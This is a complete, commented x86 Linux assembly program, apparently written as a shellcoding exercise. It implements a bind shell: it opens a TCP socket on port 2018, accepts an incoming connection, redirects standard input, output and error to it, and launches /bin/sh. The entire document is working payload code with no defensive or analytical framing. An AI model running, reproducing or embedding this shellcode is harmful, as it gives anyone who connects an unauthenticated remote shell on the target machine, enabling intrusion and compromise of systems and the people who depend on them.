global _start

section .text

_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi

    ; 
    ; socket() code block
    ;

    ; push NULL for protocol type
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_SOCKET 1
    inc bl

    ; push 1 for SOCK_STREAM
    push byte bl

    ; push 2 for AF_INET
    push byte 0x2

    ; store arguments in ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ; 
    ; bind() code block
    ; 

    ; move sockfd to ESI
    mov esi, eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_BIND 2
    pop ebx

    pop edi  ; = 1

    ; push NULL for sin_addr
    push edx

    ; push 2018 for sin_port
    push word 0xE207

    ; push 2 for sin_family
    push word bx

    ; push 16 for socketlen_t
    push byte 16

    ; store ESP pointer (sockaddr) in ECX
    push ecx

    ; push ESI for sockfd
    push esi

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ; 
    ; listen() code block
    ;

    ; save sockfd in EDX
    pop edx

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_LISTEN 4, ping kernel!
    add bl, 0x2
    int 0x80

    ;
    ; accept() code block
    ;

    ; push NULL for addrlen
    push eax

    ; push NULL for addr
    push eax

    ; __NR_socketcall 102
    mov al, 0x66

    ; #define SYS_ACCEPT 5
    inc ebx

    ; push EDX for sockfd
    push edx

    ; save arguments pointer to ECX, ping kernel!
    mov ecx, esp
    int 0x80

    ;
    ;dup2() code block
    ; 

    ; store EAX in EBX for peer socketfd from accept()
    xchg eax, ebx

    ; reset ECX (counter register) for newfd loop
    xor ecx, ecx

    ; set counter to 2
    add cl, 0x2

    ; loop for stdin, stdout, and stderr
    ; syscall for __NR_dup2 63
    ; ping kernel 3 times!

dup:
    mov al, 0x3f
    int 0x80
    dec cl
    jns dup

    ;
    ;execve() code block
    ;

    ; push NULL followed by "/bin//sh" for filename
    push eax
    push 0x68732f2f
    push 0x6e69622f

    ; store ESP pointer to "/bin//sh" in EBX
    mov ebx, esp

    ; save arguments pointer to ECX
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp

    ;__NR_execve 11, ping kernel!
    mov al, 0xb
    int 0x80
